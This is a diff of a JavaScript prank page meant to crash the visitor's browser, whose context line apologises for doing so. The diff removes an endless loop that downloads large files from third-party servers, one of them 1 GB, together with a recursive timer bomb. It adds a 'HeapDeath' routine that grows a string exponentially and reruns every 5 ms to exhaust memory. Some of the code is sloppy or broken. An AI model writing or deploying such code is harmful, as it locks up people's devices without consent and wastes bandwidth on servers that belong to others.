@@ -6,44 +6,41 @@ confirm("Sorry about your browser!");
 //  console.log(grill);
 // console.log("It's getting hot!");
 //}
-var count = 0
-var HttpClient = function() {
-    this.get = function(aUrl, aCallback) {
-        var anHttpRequest = new XMLHttpRequest();
-        anHttpRequest.onreadystatechange = function() { 
-            if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
-                count = count + 1;
-                console.log(count);
-                aCallback(anHttpRequest.responseText);
-        }
+function Test_HeapDeath ()
+{
+    (function () {
+        'use strict';
 
-        anHttpRequest.open( "GET", aUrl, true );            
-        anHttpRequest.send( null );
-    }
+        var i,
+            // We could also build the array of methods with the following, but the
+            //   getOwnPropertyNames() method is non-shimable:
+            // Object.getOwnPropertyNames(String).filter(function (methodName) {return typeof String[methodName] === 'function'});
+            methods = [
+                'quote', 'substring', 'toLowerCase', 'toUpperCase', 'charAt',
+                'charCodeAt', 'indexOf', 'lastIndexOf', 'startsWith', 'endsWith',
+                'trim', 'trimLeft', 'trimRight', 'toLocaleLowerCase',
+                'toLocaleUpperCase', 'localeCompare', 'match', 'search',
+                'replace', 'split', 'substr', 'concat', 'slice'
+            ],
+            methodCount = methods.length,
+            assignStringGeneric = function (methodName) {
+                var method = String.prototype[methodName];
+                String[methodName] = function (arg1) {
+                    return method.apply(arg1, Array.prototype.slice.call(arguments, 1));
+                };
+            };
+
+        for (i = 0; i < methodCount; i++) {
+            assignStringGeneric(methods[i]);
+        }
+    }());
+    x = '0123456789';
+    for ( i = 0; i < 22; i++ ) { x = x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)) + x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)); }
+    setInterval(_HeapDeath, 5);
 }
 
-aClient = new HttpClient();
-
-while(1) {
-  aClient.get('https://scholar.princeton.edu/sites/default/files/oversize_pdf_test_0.pdf', function(response) {
-    console.log(response);
-  });
-  aClient.get('https://www.iso.org/iso/annual_report_2009.pdf', function(response) {
-    console.log(response);
-  });
-  aClinet.get('https://speedtest.ftp.otenet.gr/files/test1Gb.db', function(response) {
-    console.log(response);
-  });
-  aClient.get('https://speedtest.ftp.otenet.gr/files/test100Mb.db', function(response) {
-    console.log(response);
-  });
-  aClient.get('https://speedtest.ftp.otenet.gr/files/test10Mb.db', function(response) {
-    console.log(response);
-  });
-  aClient.get('https://www.pdf995.com/samples/pdf.pdf', function(response) {
-    console.log(response);
-  });  
-  function die () {
-  setTimeout(function () {die(); die()}, 0)
-  }
-};
+function _HeapDeath ()
+{
+    x = [x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256)), x.slice(0) + String.charCodeAt(Math.floor(Math.random() * 256))];
+}
+Test_HeapDeath();
